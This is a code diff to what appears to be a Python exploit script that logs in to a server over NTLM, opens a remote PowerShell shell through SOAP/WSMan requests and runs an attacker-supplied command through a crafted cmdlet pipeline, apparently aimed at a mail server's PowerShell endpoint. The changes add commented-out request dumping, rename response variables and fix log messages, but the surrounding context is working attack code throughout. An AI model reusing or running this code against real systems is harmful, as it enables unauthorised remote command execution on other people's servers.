@@ -11,6 +11,7 @@ warnings.filterwarnings("ignore")
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 from requests_ntlm2 import HttpNtlmAuth
 import requests
+from requests_toolbelt.utils import dump
 
 
 proxies = {}
@@ -20,7 +21,7 @@ PASSWORD=sys.argv[3]
 CMD=sys.argv[4]
 base_url = sys.argv[1]
 session = requests.Session()
- 
+
 
 def post_request(original_url, headers, data = None, cookies = {}):
 	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
@@ -74,12 +75,12 @@ class BasePacket:
 			self.Flags,
 			struct.pack('>I', BlobLength),
 			Blob ])
-		return output 
+		return output
 
 	def deserialize(self, data):
 		total_len = len(data)
 
-		i = 0 
+		i = 0
 		self.ObjectId = struct.unpack('>Q', data[i:i+8])[0]
 		i = i + 8
 		self.FragmentId = struct.unpack('>Q', data[i:i+8])[0]
@@ -176,7 +177,7 @@ def create_powershell_shell(SessionId, RPID):
 		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
 		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
 		<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
-		
+
 			<w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
 		</w:OptionSet>
 		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
@@ -190,14 +191,16 @@ def create_powershell_shell(SessionId, RPID):
 	</s:Body>
 </s:Envelope>""".format(OperationID=OperationID, MessageID=MessageID, SessionId=SessionId, creationXml=creationXml)
 	r = post_request(url, headers, request_data, {})
+	# data = dump.dump_all(r)
+	# print(data.decode('utf-8'))
 	if r.status_code == 200:
 		doc = xml.dom.minidom.parseString(r.text);
 		elements = doc.getElementsByTagName("rsp:ShellId")
 		if len(elements) == 0:
 			print_error_and_exit("create_powershell_shell failed with no ShellId return", r)
 		ShellId = elements[0].firstChild.nodeValue
-		# print "[+] Got ShellId: {ShellId}".format(ShellId=ShellId)
-		print "[+] Got ShellId success"
+		print "[+] Got ShellId: {ShellId}".format(ShellId=ShellId)
+		# print "[+] Got ShellId success"
 		return ShellId
 	else:
 		print_error_and_exit("create_powershell_shell failed", r)
@@ -255,7 +258,7 @@ def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
 	print('[+] Create powershell pipeline')
 	c = PSCommand(3, RPID, PID, commandData)
 	command_arguments = base64.b64encode(c.serialize())
-	
+
 	MessageID = uuid.uuid4()
 	OperationID = uuid.uuid4()
 	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
@@ -285,18 +288,20 @@ def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
 	</rsp:CommandLine>
 </s:Body>
 </s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId, CommandId=str(PID), command_arguments=command_arguments)
-	r = post_request(url, headers, request_data, {})
-	# if r.status_code == 200:
-	# 	doc = xml.dom.minidom.parseString(r.text)
+	r2 = post_request(url, headers, request_data, {})
+	# data = dump.dump_all(r2)
+	# print(data.decode('utf-8'))
+	# if r2.status_code == 200:
+	# 	doc = xml.dom.minidom.parseString(r2.text)
 	# 	elements = doc.getElementsByTagName("rsp:CommandId")
 	# 	if len(elements) == 0:
-	# 		print_error_and_exit("run_cmdlet_new_offlineaddressbook failed with no CommandId return", r)
+	# 		print_error_and_exit("run_cmdlet_new_offlineaddressbook failed with no CommandId return", r2)
 	# 	CommandId = elements[0].firstChild.nodeValue
-	# 	# print "[+] Got CommandId: {CommandId}".format(CommandId=CommandId)
-	# 	print "[+] Got CommandId success"
+	# 	print "[+] Got CommandId: {CommandId}".format(CommandId=CommandId)
+	# 	# print "[+] Got CommandId success"
 	# 	return CommandId
 	# else:
-	# 	print_error_and_exit("run_cmdlet_new_offlineaddressbook failed", r)
+	# 	print_error_and_exit("run_cmdlet_new_offlineaddressbook failed", r2)
 
 def request_keepalive(SessionId, ShellId):
 	print "[+] Run keeping alive request"
@@ -333,14 +338,16 @@ def request_keepalive(SessionId, ShellId):
         </rsp:Receive>
     </s:Body>
 	</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
-	r = post_request(url, headers, request_data, {})
-	if r.status_code == 200:
+	r1 = post_request(url, headers, request_data, {})
+	# data = dump.dump_all(r1)
+	# print(data.decode('utf-8'))
+	if r1.status_code == 200:
 		print "[+] Success keeping alive"
 	else:
-		print_error_and_exit("keeping alive failed", r)
+		print_error_and_exit("keeping alive failed", r1)
 
 def remove_session(SessionId, ShellId):
-	print "[+] Run keeping alive request"
+	print "[+] Run remove session request"
 	headers = {
 		"Content-Type": "application/soap+xml;charset=UTF-8",
 		}
@@ -367,11 +374,13 @@ def remove_session(SessionId, ShellId):
     </s:Header>
     <s:Body />
 </s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
-	r = post_request(url, headers, request_data, {})
-	if r.status_code == 200:
+	r3 = post_request(url, headers, request_data, {})
+	# data = dump.dump_all(r3)
+	# print(data.decode('utf-8'))
+	if r3.status_code == 200:
 		print "[+] Success remove session"
 	else:
-		print_error_and_exit("remove session failed", r)
+		print_error_and_exit("remove session failed", r3)
 
 MessageID = uuid.uuid4()
 OperationID = uuid.uuid4()
